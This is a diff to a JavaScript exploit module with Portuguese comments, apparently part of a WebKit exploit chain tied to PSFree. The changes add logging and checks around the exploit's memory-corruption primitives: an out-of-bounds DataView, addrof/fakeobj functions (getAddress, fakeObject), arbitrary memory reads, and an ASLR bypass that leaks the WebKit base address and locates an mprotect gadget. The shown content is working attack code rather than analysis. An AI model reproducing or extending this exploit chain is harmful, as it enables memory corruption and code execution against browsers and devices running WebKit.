@@ -1,10 +1,11 @@
 // js/script3/testArrayBufferVictimCrash.mjs (v21 - Calculo ASLR CORRETO da Base WebKit - Integrado com PSFree)
+
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
 // =======================================================================================
 
-import { toHex, log } from '../module/utils.mjs'; // Remover AdvancedInt64 e isAdvancedInt64Object da importação
+import { toHex, log, sleep } from '../module/utils.mjs'; // Remover AdvancedInt64 e isAdvancedInt64Object da importação
 import {
     setupOOBPrimitive,
     getOOBDataView,
@@ -312,16 +313,23 @@ async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
 
             // Verifica se 'addr' é uma instância válida de Int e não é zero.
             if (!(addr instanceof Int) || addr.eq(new Int(0,0))) { // Substituir isAdvancedInt64Object e AdvancedInt64.Zero
-                logFn(`[${FNAME}] FALHA: getAddress retornou endereço inválido para test_obj.`, "error", FNAME);
+                logFn(`[${FNAME}] FALHA: getAddress retornou endereço inválido para test_obj. ENDERECO: ${addr.toString(true)}`, "error", FNAME);
                 throw new Error("getAddress falhou na estabilização.");
             }
 
             const faked_obj = fakeObject(addr); // addr é Int
+            logFn(`[${FNAME}] Objeto forjado: ${faked_obj} (typeof: ${typeof faked_obj})`, "debug", FNAME);
+            if (typeof faked_obj !== 'object' && typeof faked_obj !== 'function') {
+                 logFn(`[${FNAME}] FALHA: fakeObject retornou tipo inesperado: ${typeof faked_obj}.`, "error", FNAME);
+                 throw new Error("fakeObject falhou na estabilização.");
+            }
             
             const original_val = faked_obj.a;
+            logFn(`[${FNAME}] Valor original de a em objeto forjado: ${toHex(original_val)}`, "debug", FNAME);
             faked_obj.a = 0xDEADC0DE;
             await pauseFn(LOCAL_VERY_SHORT_PAUSE);
             const new_val = faked_obj.a;
+            logFn(`[${FNAME}] Valor após escrita em forjado: ${toHex(new_val)}, Original real: ${toHex(test_obj.a)}`, "debug", FNAME);
 
             if (new_val === 0xDEADC0DE && test_obj.a === 0xDEADC0DE) {
                 logFn(`[${FNAME}] SUCESSO: getAddress/fakeObject estabilizados e funcionando!`, "good", FNAME);
@@ -561,11 +569,11 @@ export async function executeExploitChain(logFn, pauseFn) {
         const mprotect_addr_check = webkitBaseAddress.add(mprotect_plt_offset_check); // Retorna Int
         logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
         const mprotect_addr_check_as_addr = new Addr(mprotect_addr_check.lo, mprotect_addr_check.hi); // Converter para Addr
-        const mprotect_first_bytes_check = await readArbitrary(mprotect_addr_check_as_addr, 4); // readArbitrary ainda retorna AdvancedInt64
-        // mprotect_first_bytes_check virá como AdvancedInt64, acessar .low() ou .high()
+        const mprotect_first_bytes_check = await readArbitrary(mprotect_addr_check_as_addr, 4); // readArbitrary retorna Int
+        // mprotect_first_bytes_check agora é Int, acessar .lo
         // Comparar com 0x00000000 (número), então não precisa de conversão.
 
-        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
+        if (mprotect_first_bytes_check instanceof Int && mprotect_first_bytes_check.lo !== 0 && mprotect_first_bytes_check.lo !== 0xFFFFFFFF) {
             logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
         } else {
              logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
@@ -626,8 +634,8 @@ export async function executeExploitChain(logFn, pauseFn) {
         logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
         const mprotect_addr_real_as_addr = new Addr(mprotect_addr_real.lo, mprotect_addr_real.hi); // Converte para Addr
         const mprotect_first_bytes = await readUniversalJSHeap(mprotect_addr_real_as_addr, 4, logFn); // readUniversalJSHeap retorna Int
-        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
-        if (mprotect_first_bytes instanceof Int && mprotect_first_bytes.lo !== 0 && mprotect_first_bytes.lo !== 0xFFFFFFFF) { // Comparar Int.lo
+        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}.`, "leak");
+        if (mprotect_first_bytes instanceof Int && mprotect_first_bytes.lo !== 0 && mprotect_first_bytes.lo !== 0xFFFFFFFF) {
             logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes)}. ASLR validado!`, "good");
         } else {
              logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
@@ -647,7 +655,7 @@ export async function executeExploitChain(logFn, pauseFn) {
         const test_obj_addr_post_leak = getAddress(test_obj_post_leak); // Retorna Int
         logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
-        const faked_obj_for_post_leak_test = fakeObject(test_obj_addr_post_leak); // test_obj_addr_post_leak é Int
+        const faked_obj_for_post_leak_test = fakeObject(test_obj_addr_post_leak);
         if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
             throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
         }
